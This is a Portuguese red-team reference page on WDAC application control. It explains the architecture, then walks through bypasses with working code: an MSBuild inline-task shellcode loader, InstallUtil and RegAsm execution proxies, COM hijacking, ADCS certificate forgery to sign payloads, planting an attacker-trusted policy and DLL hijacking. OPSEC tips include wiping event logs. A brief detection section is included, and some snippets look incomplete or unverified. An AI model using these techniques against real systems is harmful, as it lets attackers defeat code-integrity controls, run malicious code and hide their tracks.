---
title: "WDAC Bypass"
---

# WDAC Bypass — Windows Defender Application Control

# O que é?

WDAC (Windows Defender Application Control), anteriormente chamado de Device Guard Code
Integrity, é a feature de application control mais moderna e robusta disponivel nativamente
no Windows. Ao contrario do AppLocker — que opera em userland via servico — o WDAC e
implementado diretamente no kernel via `CI.dll` (Code Integrity DLL), tornando-o nao
desabilitavel por codigo rodando em Ring 3, nem mesmo por um administrador local.

**Componentes internos do WDAC:**

```
CI.dll (Code Integrity DLL)
  — DLL de kernel responsavel por verificar integridade de codigo
  — Reside em C:\Windows\System32\CI.dll
  — Carregada durante o boot pelo kernel antes de qualquer userland
  — Implementa dois subsistemas:
      KMCI (Kernel Mode Code Integrity) — bloqueia drivers nao-assinados
      UMCI (User Mode Code Integrity)   — bloqueia executaveis nao-autorizados

Formato de politica WDAC:
  — Definidas em XML (legivel por humanos) e compiladas para binario
  — Formato XML:    SiPolicy.xml  (Si = Signing/Integrity)
  — Formato binario: SiPolicy.p7b (PKCS#7, assinado digitalmente)
  — Formato alternativo: .cip (Code Integrity Policy, Windows 10 1903+)
  — Multiplas politicas simultaneas suportadas desde Windows 10 1903

Integracao com VBS (Virtualization Based Security):
  — Com HVCI (Hypervisor Protected Code Integrity) ativo, a politica WDAC
    e protegida pelo hypervisor (Hyper-V) e nao pode ser modificada mesmo
    com SYSTEM no OS convencional
  — O hypervisor valida o codigo antes de permitir execucao mesmo que o
    kernel do OS esteja comprometido
```

**Tipos de regras suportadas em uma politica WDAC:**

```
FileRules — regras baseadas em arquivo especifico:
  Allow por Hash SHA-256:   identifica arquivo pelo conteudo
  Allow por FilePath:       permite paths com wildcards
  Allow por FileName:       permite pelo nome interno do PE
  Deny explicito:           bloqueia arquivo especifico mesmo se Allow existe

Signers — regras baseadas em certificado:
  CertRoot:    hash TBS do certificado raiz da cadeia
  CertPublisher: nome do publisher no certificado de assinatura
  CertIssuer:  CA que emitiu o certificado
  Pode ser combinado com EKU (Extended Key Usage) especifico

CISigners — signers para o proprio processo de CI (proteção de politica)

FileRuleRefs — referencias de FileRules para uso em SigningScenarios
```

**Opcoes de politica (Options) mais relevantes:**

```
Enabled:UMCI                 — ativa enforcement em user mode
Enabled:Boot Menu Protection — protege opcoes de boot
Required:WHQL                — exige drivers com assinatura WHQL
Enabled:Audit Mode           — apenas loga, nao bloqueia (Event 3076)
Disabled:Audit Mode          — modo enforce (Event 3077, bloqueia)
Enabled:Advanced Boot Options — permite F8 menu de boot seguro
Enabled:Script Enforcement   — aplica politica a scripts (PS, WSH, etc.)
Enabled:Managed Installer    — permite execucioes de instaladores gerenciados
Required:EV Signers          — exige certificado EV (Extended Validation)
Enabled:Update Policy No Reboot — atualiza politica sem reboot
```

# Onde e implementado?

O WDAC e recomendado pela Microsoft para qualquer organizacao como sucessor do AppLocker,
mas e efetivamente deployado apenas em ambientes com maturidade de seguranca elevada:

```
Ambientes corporativos de alta seguranca:
  Domain Controllers protegidos com HVCI + WDAC
  Workstations de administradores de TI e seguranca (PAW — Privileged Access Workstations)
  Servidores criticos: ADCS, HSMs, servidores de banco de dados sensiveis
  Ambientes de producao financeira: trading floors, sistemas de pagamento

Infraestrutura gerenciada pela Microsoft internamente:
  A propria Microsoft usa WDAC em todos os sistemas Windows corporativos internos
  O processo de development da Microsoft exige WDAC em maquinas de desenvolvimento

Ambientes com requisitos regulatorios avancados:
  Agencias governamentais dos EUA seguindo NIST SP 800-167 (Application Whitelisting)
  Ambientes DoD com CMMC Level 3+ (Cybersecurity Maturity Model Certification)
  Ambientes de infraestrutura critica com requisitos de integridade de codigo

Gerenciamento em escala:
  GPO (Group Policy): politicas deployadas como SiPolicy.p7b
  Microsoft Intune (MDM): politicas como .cip via OMA-URI
  SCCM / Microsoft Endpoint Configuration Manager
  Windows Autopilot para provisionamento com WDAC pre-configurado

Ambientes com HVCI (Hypervisor Protected Code Integrity):
  Requer hardware compativel: Intel VT-x/AMD-V com SLAT, IOMMU (VT-d/AMD-Vi)
  Presente por padrao em Surface Pro, Surface Book e dispositivos certificados
  Windows 11 habilita HVCI por padrao em hardware compativel
  Azure VMs de geracoes recentes suportam Trusted Launch com HVCI
```

**Onde encontrar politicas WDAC ativas no filesystem:**

```
Politica principal (formato legado):
  C:\Windows\System32\CodeIntegrity\SiPolicy.p7b

Multiplas politicas (Windows 10 1903+ com Multiple Policy Format):
  C:\Windows\System32\CodeIntegrity\CiPolicies\Active\{GUID}.cip
  Cada politica tem seu GUID unico no nome do arquivo

Backup e politicas suplementares:
  C:\Windows\System32\CodeIntegrity\CiPolicies\

Politica UEFI (protegida por Secure Boot):
  \EFI\Microsoft\Boot\SiPolicy.p7b
  Somente modificavel com acesso a particao EFI (requer admin ou reboot em PE)

Configuracao no Registry:
  HKLM\SYSTEM\CurrentControlSet\Control\CI\Config
  HKLM\SYSTEM\CurrentControlSet\Control\CI\State
  HKLM\SYSTEM\CurrentControlSet\Control\CI\Protected
```

# Como funciona de forma adequada?

O WDAC e enforced diretamente pelo kernel durante operacoes de carregamento de codigo. Nao
ha servico de userland para matar ou manipular — a verificacao acontece em Ring 0.

```
+------------------------------------------------------------------+
|  PROCESSO tenta executar ou carregar codigo                      |
|  (CreateProcess, LoadLibrary, Assembly.Load, etc.)               |
+------------------------------------------------------------------+
         |
         v
+------------------------------------------------------------------+
|  KERNEL: NtCreateSection e chamado para mapear o arquivo PE      |
|                                                                  |
|  CI.dll intercepta via callback interno de carregamento de imagem|
|  Funcao: CiValidateImageHeader                                   |
|                                                                  |
|  Verificacoes realizadas pelo CI.dll:                            |
|    1. Arquivo tem assinatura Authenticode valida?                |
|       -> Verifica cadeia de certificados contra roots confiaveis  |
|       -> Verifica CRL (Certificate Revocation List) se disponivel|
|    2. Hash do arquivo corresponde ao hash na assinatura?         |
|    3. A assinatura satisfaz alguma regra da politica ativa?      |
|       -> FileRules: hash, path ou filename corresponde?          |
|       -> Signers: publisher, CA ou EKU corresponde?              |
+------------------------------------------------------------------+
         |
         v
+------------------------------------------------------------------+
|  CONSULTA A POLITICA WDAC COMPILADA                              |
|                                                                  |
|  Politica SiPolicy.p7b (ou .cip) ja esta em memoria             |
|  carregada durante boot antes de qualquer userland               |
|                                                                  |
|  SigningScenario Value="12"  — User Mode (UMCI)                  |
|  SigningScenario Value="131" — Kernel Mode (KMCI)                |
|                                                                  |
|  Verificacao de FileRules:                                       |
|    Allow por Hash -> hash do arquivo corresponde?                |
|    Allow por Path -> path do arquivo corresponde ao wildcard?    |
|                                                                  |
|  Verificacao de Signers:                                         |
|    AllowedSigners lista signers autorizados                      |
|    Cada signer tem CertRoot (hash TBS do certificado)            |
|    Assinatura do arquivo deve encadear ate um signer autorizado  |
+------------------------------------------------------------------+
         |
         v
+------------------------------------------------------------------+
|  DECISAO FINAL                                                   |
|                                                                  |
|  +-- Corresponde a Allow rule (via hash, path ou signer)?        |
|  |     SIM (Audit Mode)   -> EVENT 3076, EXECUCAO PERMITIDA      |
|  |     SIM (Enforce Mode) -> EXECUCAO PERMITIDA                  |
|  |     NAO (Audit Mode)   -> EVENT 3076, EXECUCAO AINDA PERMITIDA|
|  |     NAO (Enforce Mode) -> EVENT 3077, EXECUCAO BLOQUEADA      |
+------------------------------------------------------------------+
```

**KMCI — Kernel Mode Code Integrity:**

```
Qualquer driver (.sys) carregado no kernel passa por verificacao KMCI.
O KMCI verifica:
  1. Driver tem assinatura WHQL (Windows Hardware Quality Labs)?
  2. Driver tem assinatura EV (Extended Validation) valida?
  3. Publisher do driver corresponde a signer autorizado na politica?

Com HVCI ativo:
  KMCI e enforced pelo hypervisor
  Mesmo um kernel comprometido nao pode carregar drivers nao-autorizados
  Bloqueia a classe inteira de ataques via drivers vulneraveis (BYOVD)
```

**Diferenca critica entre AppLocker e WDAC:**

```
ASPECTO          | AppLocker         | WDAC
-----------------+-------------------+-------------------------
Enforcement layer| Userland (servico) | Kernel (CI.dll)
Componente       | AppIDSvc          | CI.dll + Kernel CI
Desabilitar admin| Parar o servico   | Impossivel sem reboot +
                 |                   | politica nova
HVCI compativel  | Nao               | Sim
Bypass via admin | Relativamente     | Muito dificil
                 | simples           |
Scope de scripts | Via script engine | Script Enforcement option
```

**Microsoft Recommended Block Rules — lista de LOLBins bloqueados por padrao:**

A Microsoft mantem uma lista de binarios conhecidos como LOLBins (Living Off the Land Binaries)
que sao explicitamente bloqueados na politica recomendada. Incluem:

```
addinprocess.exe, addinprocess32.exe, addinutil.exe
aspnet_compiler.exe, bash.exe, bginfo.exe (vulneravel)
cdb.exe, cmstp.exe (conhecido bypass), csi.exe
dbghost.exe, dbgsvc.exe, dnscmd.exe
fsi.exe, fsiAnyCpu.exe
infdefaultinstall.exe
kd.exe, kill.exe
msbuild.exe (quando nao configurado como Managed Installer)
mshta.exe, mwipsess.exe
ntsd.exe
rcsi.exe
regasm.exe, regsvcs.exe (quando nao em contexto de dev)
remote.exe, runscripthelper.exe
texttransform.exe, visualuiaverifynative.exe
wfc.exe, windbg.exe, wmic.exe (em alguns cenarios)
xsd.exe
```

Esta lista e atualizada regularmente pela Microsoft e deve ser aplicada como politica
suplementar em qualquer deployment WDAC.

---

## A Mecânica Kernel-Mode do WDAC

### WDAC vs AppLocker — Diferença Arquitetural

| Aspecto | AppLocker | WDAC |
|---|---|---|
| Camada de enforcement | User-mode (via SRP/ARP) | Kernel-mode (CI.dll) |
| Componente principal | `AppIDSvc` (serviço) | `CI.dll` + Kernel CI |
| Pode ser desabilitado por admin local | Sim, parando o serviço | Não sem policy change |
| HVCI compatível | Não | Sim |
| Bypass via admin local | Relativamente simples | Muito difícil |
| Granularidade | Regras por publisher, hash, path | Idem + script enforcement |
| Aplicável a scripts | PowerShell constrained mode | PS constrained + mais |

O ponto crítico: AppLocker é enforced por um **serviço Windows** (`AppIDSvc`). Um administrador local pode parar o serviço ou manipulá-lo. WDAC é enforced pelo **kernel** através do driver de Code Integrity integrado ao sistema operacional — não há "serviço para matar".

### Pipeline de Enforcement do WDAC

Quando um PE (Portable Executable) tenta ser carregado, o seguinte ocorre:

```
[Processo tenta carregar PE]
        |
        v
[NT Kernel: NtCreateSection]
        |
        v
[CI.dll: CiValidateImageHeader]
        |
        v
[Verifica assinatura digital do PE]
        |
        +---> [Assinado por CA confiável?]
        |          SIM -> [Verifica contra policy ativa]
        |          NÃO -> [BLOCK / EVENT 3077]
        |
        v
[Policy permite publisher/hash/path?]
        |
        +---> SIM -> [ALLOW — PE é carregado]
        +---> NÃO -> [BLOCK / EVENT 3077]
```

### Anatomia de uma Policy WDAC

Uma policy WDAC começa como arquivo XML e é compilada para formato binário `.p7b` (PKCS#7):

```xml
<?xml version="1.0" encoding="utf-8"?>
<SiPolicy xmlns="urn:schemas-microsoft-com:sipolicy">
  <VersionEx>10.0.0.0</VersionEx>
  <PolicyTypeID>{A244370E-44C9-4C06-B551-F6016E563076}</PolicyTypeID>
  <PlatformID>{2E07F7E4-194C-4D20-B96C-134408E97754}</PlatformID>
  <Rules>
    <Rule>
      <Option>Enabled:UMCI</Option>        <!-- User Mode Code Integrity -->
    </Rule>
    <Rule>
      <Option>Enabled:Boot Menu Protection</Option>
    </Rule>
    <Rule>
      <Option>Required:WHQL</Option>       <!-- Drivers precisam ser WHQL-signed -->
    </Rule>
    <Rule>
      <Option>Enabled:Audit Mode</Option>  <!-- Apenas loga, não bloqueia -->
    </Rule>
    <!-- OU: -->
    <!-- <Option>Disabled:Audit Mode</Option> --> <!-- Enforce mode -->
  </Rules>
  <EKUs />
  <FileRules>
    <!-- Regras de hash específico -->
    <Allow ID="ID_ALLOW_A_1" FriendlyName="notepad.exe" Hash="..." />
    <!-- Regras de wildcard de path -->
    <Allow ID="ID_ALLOW_B_1" FriendlyName="Windows" FilePath="C:\Windows\*" />
  </FileRules>
  <Signers>
    <!-- Publisher rules -->
    <Signer ID="ID_SIGNER_MICROSOFT_1" Name="Microsoft Windows">
      <CertRoot Type="TBS" Value="..." />
    </Signer>
  </Signers>
  <SigningScenarios>
    <SigningScenario Value="131" ID="ID_SIGNINGSCENARIO_DRIVERS_1" FriendlyName="Kernel Mode">
      <ProductSigners>
        <AllowedSigners>
          <AllowedSigner SignerId="ID_SIGNER_MICROSOFT_1" />
        </AllowedSigners>
      </ProductSigners>
    </SigningScenario>
    <SigningScenario Value="12" ID="ID_SIGNINGSCENARIO_WINDOWS" FriendlyName="User Mode">
      <ProductSigners>
        <AllowedSigners>
          <AllowedSigner SignerId="ID_SIGNER_MICROSOFT_1" />
        </AllowedSigners>
      </ProductSigners>
    </SigningScenario>
  </SigningScenarios>
</SiPolicy>
```

Compilação do XML para binário:
```powershell
# ConvertFrom-CIPolicy compila o XML para .p7b
ConvertFrom-CIPolicy -XmlFilePath .\policy.xml -BinaryFilePath .\SiPolicy.p7b
```

### Onde Ficam as Policies

```
# Policy ativa do sistema (boot-time, UEFI-based)
C:\Windows\System32\CodeIntegrity\SiPolicy.p7b

# Múltiplas policies (Windows 10 1903+)
C:\Windows\System32\CodeIntegrity\CiPolicies\Active\{GUID}.cip

# Backup/referência
C:\Windows\System32\CodeIntegrity\CiPolicies\

# EFI partition (UEFI Secure Boot policies)
\EFI\Microsoft\Boot\SiPolicy.p7b

# Registry — configuração CI
HKLM\SYSTEM\CurrentControlSet\Control\CI\Config
HKLM\SYSTEM\CurrentControlSet\Control\CI\State
```

### Modos de Operação

**Audit Mode**: Evento 3076 é gerado, execução permitida. Ideal para deployments iniciais.
**Enforce Mode**: Evento 3077 é gerado, execução bloqueada. Produção.

---

## Na Prática

### Fase 1: Reconhecimento da Policy Ativa

Antes de qualquer bypass, mapear o que está enforced:

```powershell
# CiTool.exe (Windows 11 / Server 2022+)
CiTool.exe --list-policies
CiTool.exe --list-policies -json

# Verificar registry
reg query "HKLM\SYSTEM\CurrentControlSet\Control\CI\Config" /v VerifiedAndReputablePolicyState
reg query "HKLM\SYSTEM\CurrentControlSet\Control\CI\State"

# Listar policies ativas via PowerShell
Get-CIPolicy -FilePath C:\Windows\System32\CodeIntegrity\SiPolicy.p7b

# Verificar se WDAC está em enforce ou audit mode
$ciState = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Config").VerifiedAndReputablePolicyState
# 0 = Off, 1 = Audit, 2 = Enforce

# Verificar múltiplas policies (Multiple Policy Format)
Get-ChildItem "C:\Windows\System32\CodeIntegrity\CiPolicies\Active\" -Filter "*.cip"

# Converter .cip/.p7b para XML legível
ConvertFrom-CIPolicy -BinaryFilePath .\SiPolicy.p7b -XmlFilePath .\policy_legivel.xml
```

---

## Exemplos de Código / Comandos

### Bypass 1: LOLBINs Microsoft-Signed Não Bloqueados

Muitas policies WDAC usam a regra "Allow Microsoft" que confia em qualquer binário assinado pela Microsoft. Isso cria uma superfície de ataque enorme via Living-Off-The-Land Binaries (LOLBINs).

#### MSBuild.exe — Managed Installer

MSBuild tem status especial de "Managed Installer" em muitas policies WDAC. Managed Installers são programas confiáveis que podem instalar outros programas.

```xml
<!-- msbuild_payload.xml — projeto MSBuild malicioso -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <ClassicTask />
  </Target>
  <UsingTask
    TaskName="ClassicTask"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using System.Runtime.InteropServices;
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;

          public class ClassicTask : Task
          {
              [DllImport("kernel32")]
              private static extern IntPtr VirtualAlloc(
                  IntPtr lpAddress, uint dwSize,
                  uint flAllocationType, uint flProtect);

              [DllImport("kernel32")]
              private static extern bool VirtualFree(
                  IntPtr lpAddress, uint dwSize, uint dwFreeType);

              [DllImport("kernel32")]
              private static extern IntPtr CreateThread(
                  IntPtr lpThreadAttributes, uint dwStackSize,
                  IntPtr lpStartAddress, IntPtr lpParameter,
                  uint dwCreationFlags, IntPtr lpThreadId);

              [DllImport("kernel32")]
              private static extern uint WaitForSingleObject(
                  IntPtr hHandle, uint dwMilliseconds);

              public override bool Execute()
              {
                  // Shellcode aqui (ex: Cobalt Strike stageless)
                  byte[] shellcode = new byte[] { /* ... */ };

                  IntPtr addr = VirtualAlloc(
                      IntPtr.Zero, (uint)shellcode.Length,
                      0x3000, // MEM_COMMIT | MEM_RESERVE
                      0x40);  // PAGE_EXECUTE_READWRITE

                  Marshal.Copy(shellcode, 0, addr, shellcode.Length);
                  IntPtr hThread = CreateThread(
                      IntPtr.Zero, 0, addr,
                      IntPtr.Zero, 0, IntPtr.Zero);
                  WaitForSingleObject(hThread, 0xFFFFFFFF);
                  return true;
              }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```cmd
# Execução
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe msbuild_payload.xml
```

#### WinGet como Managed Installer

```powershell
# WinGet é managed installer em Windows 11
# Pode ser abusado para instalar pacotes de fonte customizada
winget install --manifest .\malicious_manifest.yaml
```

#### DotNet.exe — Execução de Assemblies

```cmd
# dotnet.exe pode executar assemblies .NET diretamente
dotnet .\payload.dll

# Com script runner
dotnet-script payload.csx
```

#### InstallUtil — Proxy de Execução .NET

```csharp
// InstallUtil_Bypass.cs
using System;
using System.ComponentModel;
using System.Configuration.Install;

[RunInstaller(true)]
public class InstallHelper : Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        // Código executado durante /U (uninstall)
        System.Diagnostics.Process.Start("cmd.exe", "/c calc.exe");
    }
}
```

```cmd
# Compilar
csc.exe /target:library InstallUtil_Bypass.cs

# Executar via InstallUtil (Microsoft-signed, .NET framework)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U InstallUtil_Bypass.dll
```

#### RegAsm / RegSvcs

```csharp
// RegAsm_Bypass.cs
using System;
using System.Runtime.InteropServices;
using System.EnterpriseServices;

[ComVisible(true)]
[Guid("7B455F6A-3CAC-4B4C-B234-12E3B8A21B72")]
public class Payload : ServicedComponent
{
    // Executado quando registrado via regasm
    [ComRegisterFunction]
    public static void Register(string path)
    {
        System.Diagnostics.Process.Start("cmd.exe", "/c whoami > C:\\temp\\result.txt");
    }
    [ComUnregisterFunction]
    public static void Unregister(string path) { }
}
```

```cmd
# RegAsm
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U payload.dll

# RegSvcs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe payload.dll
```

### Bypass 2: COM Objects Em-Processo (In-Process)

COM objects que rodam in-process (DLLs carregadas no processo chamador) geralmente não são verificados pela policy WDAC da mesma forma que EXEs standalone. Se um COM object legítimo (Microsoft-signed) carrega uma DLL que nós controlamos, podemos executar código.

```powershell
# Identificar COM objects que carregam DLLs de paths writable
# COM objects registrados sob HKCU podem ser manipulados sem admin

# Ver COM hijacking opportunities
$regPath = "HKCU:\Software\Classes\CLSID"
# Criar CLSID override que aponta para nossa DLL
New-Item -Path "$regPath\{GUID-DO-COM-LEGITIMO}" -Force
New-ItemProperty -Path "$regPath\{GUID-DO-COM-LEGITIMO}\InprocServer32" `
    -Name "(default)" -Value "C:\Users\user\payload.dll"
New-ItemProperty -Path "$regPath\{GUID-DO-COM-LEGITIMO}\InprocServer32" `
    -Name "ThreadingModel" -Value "Apartment"
```

### Bypass 3: XOML Workflow (Windows Workflow Foundation)

Windows Workflow Foundation suporta arquivos XOML (eXtensible Object Markup Language) que são processados pelo runtime do WF. Isso permite execução de código arbitrário via um formato de arquivo que pode não ser coberto pela policy.

```xml
<!-- payload.xoml -->
<SequentialWorkflowActivity
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:code="clr-namespace:System.Workflow.Activities;Assembly=System.Workflow.Activities">
  <code:CodeActivity ExecuteCode="Execute" />
</SequentialWorkflowActivity>
```

```csharp
// Compilar e executar XOML via WF runtime
using System.Workflow.Runtime;
using System.Workflow.Activities;

WorkflowRuntime runtime = new WorkflowRuntime();
runtime.StartRuntime();
WorkflowInstance instance = runtime.CreateWorkflow(
    typeof(SequentialWorkflowActivity),
    parameters);
instance.Start();
```

### Bypass 4: Via ADCS — Assinatura com Certificado Forjado

Este é o bypass mais sofisticado: usar Active Directory Certificate Services para obter ou forjar um certificado com EKU de Code Signing, assinar o payload, e (opcionalmente) adicionar o certificado à policy WDAC.

#### Etapa 1: Identificar Templates de Certificado Vulneráveis

```powershell
# Certify.exe — enumera templates ADCS vulneráveis
.\Certify.exe find /vulnerable

# ESC1: Template permite Client Authentication + SAN arbitrário
# ESC3: Template tem EKU de Certificate Request Agent
# Buscar templates com Code Signing EKU (OID 1.3.6.1.5.5.7.3.3)
.\Certify.exe find /eku:1.3.6.1.5.5.7.3.3
```

#### Etapa 2: Solicitar Certificado com Code Signing EKU

```powershell
# Via Certify — solicitar certificado de code signing
.\Certify.exe request /ca:DC01\CertAuthority /template:CodeSigning

# Salvar certificado
certreq -retrieve <RequestID> certificate.cer
```

#### Etapa 3: Assinar o Payload

```powershell
# Importar certificado para store local
Import-Certificate -FilePath .\certificate.cer -CertStoreLocation Cert:\CurrentUser\My

# Assinar binário com signtool
& "C:\Program Files (x86)\Windows Kits\10\bin\10.0.19041.0\x64\signtool.exe" sign `
    /fd sha256 `
    /n "CN=Nome_Do_Cert" `
    .\payload.exe

# Verificar assinatura
Get-AuthenticodeSignature .\payload.exe
```

#### Etapa 4: ForgeCert — Forjar Certificado de CA

Se temos acesso ao certificado e chave privada da CA (via DA/EA compromise):

```bash
# ForgeCert — forja certificado assinado pela CA comprometida
# (https://github.com/GhostPack/ForgeCert)
.\ForgeCert.exe `
    --CaCertPath ca.pfx `
    --CaCertPassword "senha" `
    --Subject "CN=Red Team Code Signing" `
    --SubjectAltName "codesigning@empresa.local" `
    --EKUs "1.3.6.1.5.5.7.3.3" `  # Code Signing EKU
    --NewCertPath forged.pfx `
    --NewCertPassword "redteam123"

# Assinar payload com cert forjado
signtool sign /fd sha256 /f forged.pfx /p "redteam123" payload.exe
```

### Bypass 5: Adicionar Policy que Permite Nosso Certificado

Com privilégios de admin (ou via GPO em domain context):

```powershell
# Criar nova policy que confia no nosso certificado forjado/obtido
$cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new(".\forged.pfx", "redteam123")

# Extrair TBS Hash do certificado
$tbsHash = Get-TBSCertHash -Certificate $cert

# Criar XML da nova policy
$policyXml = @"
<SiPolicy xmlns="urn:schemas-microsoft-com:sipolicy">
  <VersionEx>10.0.0.1</VersionEx>
  <PolicyTypeID>{A244370E-44C9-4C06-B551-F6016E563077}</PolicyTypeID>
  <Rules>
    <Rule><Option>Enabled:UMCI</Option></Rule>
  </Rules>
  <EKUs />
  <FileRules />
  <Signers>
    <Signer ID="ID_SIGNER_ATTACKER" Name="Attacker Code Signing">
      <CertRoot Type="TBS" Value="$tbsHash" />
    </Signer>
  </Signers>
  <SigningScenarios>
    <SigningScenario Value="12" ID="ID_SIGNINGSCENARIO_UMCI">
      <ProductSigners>
        <AllowedSigners>
          <AllowedSigner SignerId="ID_SIGNER_ATTACKER" />
        </AllowedSigners>
      </ProductSigners>
    </SigningScenario>
  </SigningScenarios>
  <UpdatePolicySigners />
  <CiSigners />
</SiPolicy>
"@

$policyXml | Out-File .\attacker_policy.xml
ConvertFrom-CIPolicy -XmlFilePath .\attacker_policy.xml -BinaryFilePath .\attacker_policy.cip

# Deploy da policy suplementar (não substitui, adiciona)
$policyId = "{A244370E-44C9-4C06-B551-F6016E563077}"
Copy-Item .\attacker_policy.cip "C:\Windows\System32\CodeIntegrity\CiPolicies\Active\$policyId.cip"

# Ativar via CiTool
CiTool.exe --update-policy .\attacker_policy.cip
```

### Bypass 6: Writable Path Exploitation — DLL Hijacking de Aplicativo Whitelisted

Se a policy permite execução de aplicativos de um path específico (`C:\ProgramData\AppWhitelisted\*`), e esse path é writable por usuários não-privilegiados:

```powershell
# Identificar paths whitelisted por regras de path
# (após ter convertido a policy para XML)
Select-Xml -Path .\policy_legivel.xml -XPath "//Allow[@FilePath]" | 
    Select-Object -ExpandProperty Node |
    Select-Object FilePath, FriendlyName

# Verificar ACLs dos paths whitelisted
$paths = @(
    "C:\ProgramData\AppWhitelisted",
    "C:\Users\Public\Software"
)

foreach ($path in $paths) {
    $acl = Get-Acl $path
    $acl.Access | Where-Object {
        $_.FileSystemRights -match "Write|FullControl" -and
        $_.IdentityReference -match "Users|Everyone|Authenticated"
    }
}

# Se path é writable: copiar payload assinado (ou usar DLL hijacking)
# Exemplo: aplicativo legítimo carrega version.dll de seu diretório
Copy-Item .\malicious_version.dll "C:\ProgramData\AppWhitelisted\version.dll"

# Executar aplicativo legítimo que vai carregar nossa DLL
Start-Process "C:\ProgramData\AppWhitelisted\legitimate_app.exe"
```

### Bypass 7: Wscript.exe com Scripts COM

```vbs
' payload.vbs — executado via wscript.exe (Microsoft-signed)
' WScript é geralmente permitido mesmo em ambientes restritos
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Executar via COM object
Dim objWord
Set objWord = CreateObject("Word.Application")
objWord.Visible = False

' Macro execution via Word COM
Dim objDoc
Set objDoc = objWord.Documents.Add()
objDoc.VBProject.VBComponents("ThisDocument").CodeModule.AddFromString _
    "Sub AutoOpen()" & Chr(13) & _
    "  Shell ""cmd.exe /c whoami > C:\temp\out.txt""" & Chr(13) & _
    "End Sub"
```

```cmd
wscript.exe //E:vbscript payload.vbs
cscript.exe payload.vbs
```

---

## Detecção e OPSEC

### Eventos Gerados

| Event ID | Source | Descrição | Modo |
|---|---|---|---|
| 3076 | Microsoft-Windows-CodeIntegrity/Operational | Audit block | Audit Mode |
| 3077 | Microsoft-Windows-CodeIntegrity/Operational | Enforce block | Enforce Mode |
| 3089 | Microsoft-Windows-CodeIntegrity/Operational | Signing info | Ambos |
| 8028/8029 | AppLocker | Script block | AppLocker Script |
| 3001 | CI | Driver load attempt | Ambos |

```powershell
# Blue Team: monitorar eventos de WDAC
Get-WinEvent -LogName "Microsoft-Windows-CodeIntegrity/Operational" |
    Where-Object { $_.Id -in @(3076, 3077) } |
    Select-Object TimeCreated, Id, Message |
    Format-List

# Detectar uso anômalo de MSBuild
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object { $_.Id -eq 1 -and $_.Message -match "msbuild.exe" } |
    Select-Object TimeCreated, Message
```

### Indicadores de Ataque (Red Team — o que evitar)

1. **Não executar binários não-assinados diretamente** — Event 3077 imediato
2. **MSBuild com task factory inline** — detecção via Sysmon Process Create + CommandLine
3. **InstallUtil /U** — argumento `/U` (uninstall) sem contexto de instalação é suspeito
4. **RegAsm sem contexto de desenvolvimento** — raro em produção, fácil de filtrar
5. **Cópia de certificados para stores locais** — auditado via Security Event Log 4886
6. **CiTool.exe --update-policy** — raramente executado por não-admins, gera evento

### Recomendações OPSEC para Red Team

```
ANTES DO BYPASS:
1. Ler policy ativa com ConvertFrom-CIPolicy antes de tentar qualquer execução
2. Identificar se está em Audit Mode (Event 3076) — mais seguro para reconhecimento
3. Mapear quais LOLBINs são explicitamente negados na policy

DURANTE O BYPASS:
4. Preferir execution via managed installers sobre injeção de DLL
5. Usar assemblies .NET in-memory (reflection) ao invés de DLLs em disco
6. Se assinando payloads, usar cadeia de certificado válida que passa CRL check

APÓS O BYPASS:
7. Limpar eventos de CI se possível (requer SYSTEM + disabling audit)
8. Remover políticas suplementares adicionadas
9. Verificar logs: Get-WinEvent -LogName "Microsoft-Windows-CodeIntegrity/Operational"
```

### Verificar Ambiente Antes de Atacar

```powershell
# Script de reconhecimento pré-bypass
function Invoke-WDACRecon {
    Write-Host "[*] Verificando WDAC Status..."
    
    # Verificar se CI está ativo
    $ciConfig = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Config" -ErrorAction SilentlyContinue
    if ($ciConfig) {
        Write-Host "[+] CI Config encontrado"
        Write-Host "    VerifiedAndReputablePolicyState: $($ciConfig.VerifiedAndReputablePolicyState)"
    }
    
    # Verificar políticas ativas
    $activePolicies = Get-ChildItem "C:\Windows\System32\CodeIntegrity\CiPolicies\Active\" `
        -Filter "*.cip" -ErrorAction SilentlyContinue
    Write-Host "[+] Políticas CIP ativas: $($activePolicies.Count)"
    
    # CiTool se disponível
    $ciTool = Get-Command CiTool.exe -ErrorAction SilentlyContinue
    if ($ciTool) {
        Write-Host "[+] CiTool disponível — executando list-policies"
        & CiTool.exe --list-policies
    }
    
    # Verificar modo
    $siPolicy = "C:\Windows\System32\CodeIntegrity\SiPolicy.p7b"
    if (Test-Path $siPolicy) {
        Write-Host "[+] SiPolicy.p7b presente"
        # Tentar converter para XML
        $tempXml = "$env:TEMP\sipolicy_recon.xml"
        try {
            ConvertFrom-CIPolicy -BinaryFilePath $siPolicy -XmlFilePath $tempXml
            $xml = [xml](Get-Content $tempXml)
            $auditMode = $xml.SiPolicy.Rules.Rule | 
                Where-Object { $_.Option -match "Audit" }
            if ($auditMode) {
                Write-Host "[*] Policy em AUDIT MODE — execução não bloqueada"
            } else {
                Write-Host "[!] Policy em ENFORCE MODE — bloqueio ativo"
            }
            Remove-Item $tempXml -Force
        } catch {
            Write-Host "[-] Não foi possível decodificar SiPolicy"
        }
    }
}

Invoke-WDACRecon
```

---

---

## CFG — Control Flow Guard

CFG valida cada **indirect call/jump** antes de executar. Trabalha em conjunto com WDAC — código assinado + CFG = exploração de ROP fica muito mais difícil.

### Funcionamento Interno

